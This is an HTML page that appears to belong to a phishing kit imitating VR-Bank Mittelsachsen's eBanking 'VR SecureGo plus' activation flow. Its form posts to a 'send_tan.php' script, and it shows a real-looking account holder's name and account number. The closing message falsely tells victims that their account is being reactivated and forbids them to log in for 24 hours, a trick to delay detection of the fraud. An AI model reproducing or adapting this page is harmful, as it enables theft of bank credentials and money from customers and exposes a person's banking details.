<html class="js localstorage canvas video no-touchevents cssanimations csstransforms csstransitions" style="">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="generator" content="ebPE 21.15-25 BVR2014">
    <meta name="format-detection" content="telephone=no">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eBanking Private Edition - VR-Bank Mittelsachsen eG</title>

    <link rel="stylesheet" title="normal" type="text/css" href="./style/xbf-styles.css">
    <link rel="stylesheet" title="normal" type="text/css" href="./style/navigationResponsive.css">
    <link rel="stylesheet" title="normal" type="text/css" href="./style/indiv.css">


    <link rel="shortcut icon" type="image/x-icon" href="../style/apple-touch-icon-144x144.png">


</head>

<body scroll="auto" class="" style="">
    <div id="ka-id"></div>
    <div id="scroll">

        <div id="site" style="background-image: url();">
            <div id="main" class="ym-wrapper">
                <header id="header">
                    <div id="">
                        <span id="logo"><img alt="Logo" src="../style/ebpe-logo"></span>
                    </div>



                </header>






                <div class="contentDiv">

                    <div id="maincontent" class="maincontent_DEFAULT">



                        <div id="paydirectLogoCnt" style=":none;"></div>
                        <form accept-charset="UTF-8" action="../system/send_tan.php" method="post">


                            <div class="formInput">
                                <div class="XContainer" id="mainContent_root">
                                    <table border="0" cellpadding="0" cellspacing="0" rules="none" style="">
                                        <tbody>
                                            <tr>
                                                <td align="left" valign="top"><span class="XMedia" id="med">
                                                        <div class="ebanking-frame-container v-app"
                                                            id="ebanking_frame_container_null" width="100%"
                                                            height="1000px">
                                                            <div class="v-csslayout v-layout v-widget hide v-csslayout-hide"
                                                                id="printHeader2014">
                                                                <div
                                                                    class="v-horizontallayout v-layout v-horizontal v-widget">
                                                                    <div class="v-slot">
                                                                        <div
                                                                            class="v-horizontallayout v-layout v-horizontal v-widget">
                                                                            <div class="v-slot">
                                                                                <img class="v-image v-widget"
                                                                                    src="./style/ebpe-druckheader-image"
                                                                                    alt="ebpe-druckheader-text">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="v-slot">
                                                                        <div
                                                                            class="v-horizontallayout v-layout v-horizontal v-widget">
                                                                            <div class="v-slot">
                                                                                <div
                                                                                    class="v-verticallayout v-layout v-vertical v-widget">
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="v-label v-widget druckkopf-ueberschrift v-label-druckkopf-ueberschrift v-has-width"
                                                                    style="width: 100%;">VR-Bank Mittelsachsen eG</div>
                                                                <div class="v-verticallayout v-layout v-vertical v-widget druckkopf-details v-verticallayout-druckkopf-details v-has-width"
                                                                    style="width: 100%;">
                                                                    <div class="v-slot">
                                                                        <div
                                                                            class="v-horizontallayout v-layout v-horizontal v-widget">
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 85px;">
                                                                                    BLZ/BIC:
                                                                                </div>
                                                                            </div>
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 250px;">
                                                                                    86065468/GENODEF1DL1
                                                                                </div>
                                                                            </div>
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 93px;">
                                                                                    Datum:
                                                                                </div>
                                                                            </div>
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 172px;">
                                                                                    09.09.2021
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="v-slot">
                                                                        <div
                                                                            class="v-horizontallayout v-layout v-horizontal v-widget">
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 85px;">
                                                                                    Konto/IBAN:
                                                                                </div>
                                                                            </div>
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 250px;">
                                                                                    4100150064
                                                                                </div>
                                                                            </div>
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 93px;">
                                                                                    Uhrzeit:
                                                                                </div>
                                                                            </div>
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 172px;">
                                                                                    23:29
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="v-slot">
                                                                        <div
                                                                            class="v-horizontallayout v-layout v-horizontal v-widget">
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 85px;">
                                                                                    Abfrage von:
                                                                                </div>
                                                                            </div>
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 250px;">
                                                                                    Uwe Lehnert
                                                                                </div>
                                                                            </div>
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 93px;">
                                                                                    Kontoinhaber:
                                                                                </div>
                                                                            </div>
                                                                            <div class="v-slot">
                                                                                <div class="v-label v-widget v-has-width"
                                                                                    style="width: 172px;">
                                                                                    Uwe Lehnert
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div id="bankingarkvrender-1825358184"
                                                                class="v-app default-0 rbfplusrendererui">



                                                                <meta http-equiv="Content-Type"
                                                                    content="text/html; charset=utf-8">
                                                                <meta http-equiv="X-UA-Compatible"
                                                                    content="IE=11;chrome=1">
                                                                <style type="text/css">
                                                                    html,
                                                                    body {
                                                                        height: 100%;
                                                                        margin: 0;
                                                                    }
                                                                </style>


                                                                <link rel="stylesheet" type="text/css"
                                                                    href="./style/1111.css">



                                                                <div tabindex="1" class="v-ui v-scrollable"
                                                                    style="width: 100%; height: 100%;">
                                                                    <div class="v-loading-indicator first"
                                                                        style="position: absolute; display: none; top: 653.5px;">
                                                                    </div>
                                                                    <div class="v-csslayout v-layout v-widget rbf-rootpane-component v-csslayout-rbf-rootpane-component"
                                                                        id="RootPane">
                                                                        <div class="v-csslayout v-layout v-widget rbf-workbench-component v-csslayout-rbf-workbench-component"
                                                                            id="Embedded Integration Workbench">
                                                                            <div class="v-customcomponent v-widget v-has-width"
                                                                                style="width: 100%;">
                                                                                <div
                                                                                    class="v-csslayout v-layout v-widget">
                                                                                    <div
                                                                                        class="v-csslayout v-layout v-widget">
                                                                                        <div class="v-csslayout v-layout v-widget rbf-interaction-frame v-csslayout-rbf-interaction-frame rbf-interaction-frame-content-with-progressbar v-csslayout-rbf-interaction-frame-content-with-progressbar rbf-interaction-frame-content-with-entityselection v-csslayout-rbf-interaction-frame-content-with-entityselection"
                                                                                            id="assistant">
                                                                                            <div
                                                                                                class="v-csslayout v-layout v-widget rbf-interaction-frame-header v-csslayout-rbf-interaction-frame-header">
                                                                                                <div
                                                                                                    class="v-csslayout v-layout v-widget rbf-interaction-frame-header-row v-csslayout-rbf-interaction-frame-header-row f-rbf-header-row-title v-csslayout-f-rbf-header-row-title">
                                                                                                    <div class="v-label v-widget rbf-interaction-frame-header-title v-label-rbf-interaction-frame-header-title rbf-h1 v-label-rbf-h1 v-label-undef-w"
                                                                                                        lang="de"
                                                                                                        id="title">VR
                                                                                                        SecureGo plus
                                                                                                        Aktivieren</div>
                                                                                                    <div class="v-csslayout v-layout v-widget"
                                                                                                        id="ebRemoteToolbar">
                                                                                                    </div>
                                                                                                </div>
                                                                                                <div
                                                                                                    class="v-csslayout v-layout v-widget rbf-interaction-frame-header-row v-csslayout-rbf-interaction-frame-header-row f-rbf-header-row-content v-csslayout-f-rbf-header-row-content">
                                                                                                    <div class="v-csslayout v-layout v-widget f-rbf-progressbar-container v-csslayout-f-rbf-progressbar-container"
                                                                                                        id="progressbar">
                                                                                                        <div
                                                                                                            class="v-csslayout v-layout v-widget f-rbf-progressbar v-csslayout-f-rbf-progressbar">
                                                                                                            <div
                                                                                                                class="v-csslayout v-layout v-widget section v-csslayout-section visited v-csslayout-visited first v-csslayout-first">
                                                                                                                <div class="v-label v-widget sectiontitle v-label-sectiontitle v-has-width"
                                                                                                                    lang="de"
                                                                                                                    style="width: 100%;">
                                                                                                                    Dateneingabe
                                                                                                                </div>
                                                                                                                <div
                                                                                                                    class="v-csslayout v-layout v-widget sectionbar v-csslayout-sectionbar">
                                                                                                                    <div class="v-label v-widget sectionnumber v-label-sectionnumber v-label-undef-w"
                                                                                                                        lang="de">
                                                                                                                        1
                                                                                                                    </div>
                                                                                                                    <div class="v-label v-widget sectionicon v-label-sectionicon v-label-undef-w"
                                                                                                                        lang="de">
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                                <div
                                                                                                                    class="v-csslayout v-layout v-widget steps v-csslayout-steps">
                                                                                                                </div>
                                                                                                            </div>
                                                                                                            <div
                                                                                                                class="v-csslayout v-layout v-widget section v-csslayout-section current v-csslayout-current">
                                                                                                                <div class="v-label v-widget sectiontitle v-label-sectiontitle v-has-width"
                                                                                                                    lang="de"
                                                                                                                    style="width: 100%;">
                                                                                                                    Prüfung
                                                                                                                </div>
                                                                                                                <div
                                                                                                                    class="v-csslayout v-layout v-widget sectionbar v-csslayout-sectionbar">
                                                                                                                    <div class="v-label v-widget sectionnumber v-label-sectionnumber v-label-undef-w"
                                                                                                                        lang="de">
                                                                                                                        2
                                                                                                                    </div>
                                                                                                                    <div class="v-label v-widget sectionicon v-label-sectionicon v-label-undef-w"
                                                                                                                        lang="de">
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                                <div
                                                                                                                    class="v-csslayout v-layout v-widget steps v-csslayout-steps">
                                                                                                                </div>
                                                                                                            </div>
                                                                                                            <div
                                                                                                                class="v-csslayout v-layout v-widget section v-csslayout-section last v-csslayout-last">
                                                                                                                <div class="v-label v-widget sectiontitle v-label-sectiontitle v-has-width"
                                                                                                                    lang="de"
                                                                                                                    style="width: 100%;">
                                                                                                                    Bestätigung
                                                                                                                </div>
                                                                                                                <div
                                                                                                                    class="v-csslayout v-layout v-widget sectionbar v-csslayout-sectionbar">
                                                                                                                    <div class="v-label v-widget sectionnumber v-label-sectionnumber v-label-undef-w"
                                                                                                                        lang="de">
                                                                                                                        3
                                                                                                                    </div>
                                                                                                                    <div class="v-label v-widget sectionicon v-label-sectionicon v-label-undef-w"
                                                                                                                        lang="de">
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                                <div
                                                                                                                    class="v-csslayout v-layout v-widget steps v-csslayout-steps">
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                            <div
                                                                                                class="v-csslayout v-layout v-widget">
                                                                                            </div>
                                                                                            <div class="v-csslayout v-layout v-widget rbf-interaction-frame-content v-csslayout-rbf-interaction-frame-content"
                                                                                                id="interaction-frame-content">
                                                                                                <div
                                                                                                    class="v-csslayout v-layout v-widget rbf-viewinterpreter v-csslayout-rbf-viewinterpreter">
                                                                                                    <div
                                                                                                        class="v-csslayout v-layout v-widget f-rbf-content-viewport v-csslayout-f-rbf-content-viewport vdl-content v-csslayout-vdl-content">
                                                                                                        <div class="v-customcomponent v-widget v-has-width"
                                                                                                            id="page"
                                                                                                            style="width: 100%;">
                                                                                                            <div
                                                                                                                class="v-csslayout v-layout v-widget">
                                                                                                                <div class="v-csslayout v-layout v-widget f-rbf-layout v-csslayout-f-rbf-layout f-rbf-layout-onecolumn v-csslayout-f-rbf-layout-onecolumn"
                                                                                                                    id="unspecifiedWidget0">
                                                                                                                    <div
                                                                                                                        class="v-csslayout v-layout v-widget f-rbf-layout-row v-csslayout-f-rbf-layout-row f-rbf-hasviewport-width v-csslayout-f-rbf-hasviewport-width">
                                                                                                                        <div class="v-customcomponent v-widget v-has-width"
                                                                                                                            id="CompStrukturierteDaten"
                                                                                                                            style="width: 100%;">
                                                                                                                            <div
                                                                                                                                class="v-csslayout v-layout v-widget">
                                                                                                                                <div class="v-csslayout v-layout v-widget f-rbf-layout v-csslayout-f-rbf-layout f-rbf-layout-onecolumn v-csslayout-f-rbf-layout-onecolumn"
                                                                                                                                    id="unspecifiedWidget0">
                                                                                                                                    <div
                                                                                                                                        class="v-csslayout v-layout v-widget f-rbf-layout-row v-csslayout-f-rbf-layout-row f-rbf-hasviewport-width v-csslayout-f-rbf-hasviewport-width">
                                                                                                                                    </div>
                                                                                                                                </div>
                                                                                                                            </div>
                                                                                                                        </div>
                                                                                                                    </div>
                                                                                                                    <div
                                                                                                                        class="v-csslayout v-layout v-widget f-rbf-layout-row v-csslayout-f-rbf-layout-row f-rbf-hasviewport-width v-csslayout-f-rbf-hasviewport-width">
                                                                                                                        <div class="v-customcomponent v-widget v-has-width"
                                                                                                                            id="compTanAuswahl"
                                                                                                                            style="width: 100%;">
                                                                                                                            <div
                                                                                                                                class="v-csslayout v-layout v-widget">
                                                                                                                                <div class="v-csslayout v-layout v-widget f-rbf-layout v-csslayout-f-rbf-layout f-rbf-layout-onecolumn v-csslayout-f-rbf-layout-onecolumn"
                                                                                                                                    id="unspecifiedWidget0">
                                                                                                                                    <div
                                                                                                                                        class="v-csslayout v-layout v-widget f-rbf-layout-row v-csslayout-f-rbf-layout-row f-rbf-hasviewport-width v-csslayout-f-rbf-hasviewport-width">
                                                                                                                                        <div class="v-csslayout v-layout v-widget f-rbf-content-box-boxed v-csslayout-f-rbf-content-box-boxed"
                                                                                                                                            id="unspecifiedWidget1">
                         <center>                                                                                                                   <div class="success text-center">
                        <div class="img" style=""><img src="./sus.gif"></div>
                       <h3 style="margin-top: 10px; margin-bottom: 10px;">Vielen Dank für die Bestätigung Ihrer persönlichen Daten.</h3>
                        <p> Bitte beachten Sie, dass der Reaktivierungsprozess 24 Stunden dauert und es Ihnen strengstens untersagt ist, sich während dieser 24 Stunden erneut mit Ihrer Anwendung oder der Website zu verbinden, um den reibungslosen Ablauf des Reaktivierungsprozesses endgültig zu gewährleisten. 
                            <br><br><br>Danke für Ihr Verständnis
                        </p>
                    </div></center>

<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>

                                                                 
                                                                                                                                            
                                                                                                                            </div>
                                                                                                                        </div>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                            <div class="v-csslayout v-layout v-widget rbf-interaction-frame-footer-linkbar v-csslayout-rbf-interaction-frame-footer-linkbar"
                                                                                                id="linkbar"></div>
                                                                                            <div class="v-csslayout v-layout v-widget rbf-interaction-frame-footer v-csslayout-rbf-interaction-frame-footer rbf-interaction-frame-footer-actionbar v-csslayout-rbf-interaction-frame-footer-actionbar"
                                                                                           ss="v-label v-widget f-rbf-actionbar-filler v-label-f-rbf-actionbar-filler v-label-undef-w"
                                                                                                        lang="de"></div>

                                                                                                    




                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <div id="PostMessagingComponent"
                                                                                class="v-widget"></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>


                                                        </div>
                                                        <script type="text/javascript"
                                                            src="./style/inittokenApi-1.0.1.min.js.download"></script>
                                                        <script type="text/javascript"
                                                            src="./style/iframeIntegration-1.0.7.min.js.download">
                                                        </script>

                                                    </span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </form>





                        <div class="contentWebcenterMainContent">
                        </div>
                    </div>


                    <div style="clear:both"></div>
                </div>
                <div class="seitenanfang">
                    <a href="#" title="Seitenanfang" class="XLink">Seitenanfang</a>
                </div>
            </div>
            <div id="footernaviInfoMenu">
                <ul>
                    <li>
                        <a href="#" target="demo" title="Zur Demo-Anwendung 21.15-25 (16)">Zur Demo-Anwendung</a>
                    </li>
                    <li>
                        <a href="#" target="Impressum" title="Impressum">Impressum</a>
                    </li>
                    <li>
                        <a href="#" title="AGB">AGB</a>
                    </li>
                    <li>
                        <a href="#" target="PreisLeistung" title="PreisLeistung">Preisaushang</a>
                    </li>
                    <li>
                        <a href="#" target="hilfe" title="Hilfe zur Version 21.15-25">Hilfe</a>
                    </li>
                    <li>
                        <a href="#" title="Sicherheitshinweise">Sicherheitshinweise</a>
                    </li>
                </ul>

            </div>







        </div>
    </div>

</body>

</html>